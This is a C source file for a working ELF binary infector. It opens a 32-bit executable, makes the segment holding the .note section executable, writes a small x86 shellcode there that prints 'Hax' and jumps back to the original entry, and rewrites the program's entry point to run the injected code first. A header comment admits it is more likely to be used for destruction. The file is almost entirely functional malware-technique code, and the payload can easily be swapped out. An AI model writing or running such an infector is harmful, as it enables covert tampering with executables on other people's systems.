// WARNING: COULD BE MORE LIKELY USED FOR DESTRUCTION THAN INTENED PURPOSE... HOLD
// Written by: Joey DeFrancesco 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <elf.h>

#include "bso.h"

#define ADDR_OFFSET 0x16
#define SHELLCODE_SIZE 28

PRIVATE char shellcode[] = 
	"\x60\x31\xdb\x68\x48\x61\x78\x0a\x89\xe1\xf7\xe3\x43\xb2"
	"\x04\xb0\x04\xcd\x80\x5e\x61\xb8\xef\xbe\xad\xde\xff\xe0";

EXPORT int main(int argc, char **argv, char **envp)
{
	int fd, res, ret = 1;
	void *fp, *note_p = NULL;
	struct stat sb;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr;
	Elf32_Addr note = 0;

	if (argc != 2) {
		printf("Usage:  %s exe\n", argv[0]);
		goto out_noclose;
	}

	fd = open(argv[1], O_RDWR);
	if (fd < 0) {
		printf("%s: FATAL: open: %s: errno %d -> %s\n", argv[0], argv[1], errno, strerror(errno));
		goto out_noclose;
	}

	{
		char ident[EI_NIDENT];
		int n;

		if ((n = read(fd, &ident, EI_NIDENT)) != EI_NIDENT) {
			printf("%s: FATAL: Unable to verify ELF file: ", argv[0]);
			if (n < 0)
				printf("unable to read %u bytes: errno %d -> %s\n", EI_NIDENT, errno, strerror(errno));
			else
				printf("unable to read %u bytes (file truncated?)\n", EI_NIDENT);
			goto out_nounmap;
		}

		if (memcmp(ident, ELFMAG, SELFMAG) != 0) {
			printf("%s: FATAL: not an ELF file\n", argv[0]);
			goto out_nounmap;
		}

		if (ident[EI_CLASS] != ELFCLASS32)
			printf("%s: WARNING: wrong class\n", argv[0]);

		if (ident[EI_DATA] != ELFDATA2LSB)
			printf("%s: WARNING: wrong endianess\n", argv[0]);
	}

	{
		if (fstat(fd, (struct stat *) &sb) < 0) {
			printf("%s: FATAL: fstat: errno %d -> %s\n", argv[0], errno, strerror(errno));
			goto out_nounmap;
		}

		if (sb.st_size > 20 * 1024 * 1024) {
			printf("%s: WARNING: file is quite large (%u bytes), only mapping first 20MiB\n", argv[0], (unsigned int) sb.st_size);
			sb.st_size = 20 * 1024 * 1024;
		}

		fp = mmap(NULL, sb.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
		if (fp == MAP_FAILED) {
			printf("%s: FATAL: mmap %u bytes: errno %d -> %s\n", argv[0], (unsigned int) sb.st_size, errno, strerror(errno));
			goto out_nounmap;
		}
	}

	{
		ehdr = fp;

		if (ehdr->e_machine != EM_386)
			printf("%s: WARNING: wrong architecture\n", argv[0]);

		if (ehdr->e_type != ET_EXEC)
			printf("%s: WARNING: wrong type (should be ET_EXEC)\n", argv[0]);

		if (!ehdr->e_phoff || !ehdr->e_phnum || ehdr->e_phentsize != sizeof(Elf32_Phdr) || ehdr->e_phoff + (ehdr->e_phnum * ehdr->e_phentsize) > sb.st_size) {
			printf("%s: FATAL: invalid program headers\n", argv[0]);
			goto out;
		}

		if (!ehdr->e_shoff || !ehdr->e_shnum || ehdr->e_shentsize != sizeof(Elf32_Shdr) || ehdr->e_shoff + (ehdr->e_shnum * ehdr->e_shentsize) > sb.st_size) {
			printf("%s: FATAL: invalid section headers\n", argv[0]);
			goto out;
		}

		phdr = (Elf32_Phdr *) ((unsigned long) fp + ehdr->e_phoff);
		shdr = (Elf32_Shdr *) ((unsigned long) fp + ehdr->e_shoff);
	}

	{
		unsigned int i;

		for (i = 0; i < ehdr->e_shnum; i++) {
			if (shdr[i].sh_type == SHT_NOTE) {
				printf("%s: NOTICE: .note found at addr 0x%0*x\n", argv[0], (int) sizeof(shdr[i].sh_addr) * 2, shdr[i].sh_addr);
				note = shdr[i].sh_addr;
				break;
			}
		}

		if (!note) {
			printf("%s: FATAL: .note not found\n", argv[0]);
			goto out;
		}
		
		if (ehdr->e_entry == note) {
			do {
				res = d_query("%s: file already altered, continue? [y/N]: ", argv[0]);
				switch (res) {
					case 'Y':
					case 'y':
						break;
					case 'N':
					case 'n':
					case 0:
						puts(d_userabort);
					case -1:
						goto out;
						break;
					default:
						res = 0;
						break;
				}
			} while(!res);
		}
	}

	{
		unsigned int i;
		//-------------------------------------------------------------------------------------------------------------

 		/* This calculates in **OUR** address space where .note will be, to copy the shellcode into */
		for (i = 0; i < ehdr->e_phnum; i++) {
			if (phdr[i].p_type == PT_LOAD) {
				if (phdr[i].p_vaddr < note && phdr[i].p_vaddr + phdr[i].p_memsz > note) {
					printf("%s: NOTICE: LOAD section with .note found (vaddr = 0x%0*x)\n", argv[0], (int) sizeof(phdr[i].p_vaddr) * 2, phdr[i].p_vaddr);
					phdr[i].p_flags |= PF_X;
					note_p = (void *) (note - phdr[i].p_vaddr + phdr[i].p_offset + ((unsigned long) fp));
					break;
				}
			}
		}

		if (!note_p) {
			printf("%s: FATAL: segment with .note wasn't found (invalid SHT_NOTE section?)\n", argv[0]);
			goto out;
		}
	  //----------------------------------------------------------------------------------------------------------------
	}

	{
		do {
			res = d_query("%s: alter `%s'? [Y/n]: ", argv[0], argv[1]);
			switch (res) {
				case 'Y':
				case 'y':
				case 0:
					res = 'y';
					break;
				case 'N':
				case 'n':
					puts(d_userabort);
				case -1:
					goto out;
					break;
				default:
					res = 0;
					break;
				}
		} while(!res);
		memcpy(shellcode + ADDR_OFFSET, &ehdr->e_entry, sizeof(ehdr->e_entry));
		memcpy(note_p, shellcode, SHELLCODE_SIZE);  //note_p is where .note is in our space.
		ehdr->e_entry = note;
		msync(fp, sb.st_size, MS_SYNC);
	}

	ret = 0;

	out:
	munmap(fp, sb.st_size);
	out_nounmap:
	close(fd);
	out_noclose:
	return ret;
}
